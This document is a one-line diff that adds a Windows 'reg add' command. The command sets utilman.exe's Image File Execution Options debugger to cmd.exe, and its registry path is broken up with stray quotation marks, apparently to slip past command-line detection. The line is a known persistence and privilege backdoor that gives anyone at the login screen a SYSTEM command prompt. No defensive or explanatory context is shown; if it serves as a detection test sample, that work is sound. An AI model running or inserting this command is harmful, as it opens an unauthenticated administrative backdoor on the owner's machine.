@@ -1,0 +1,1 @@
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\Curre"ntVer"sion\Image File Exec"ut"ion Options\ut"il"man.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
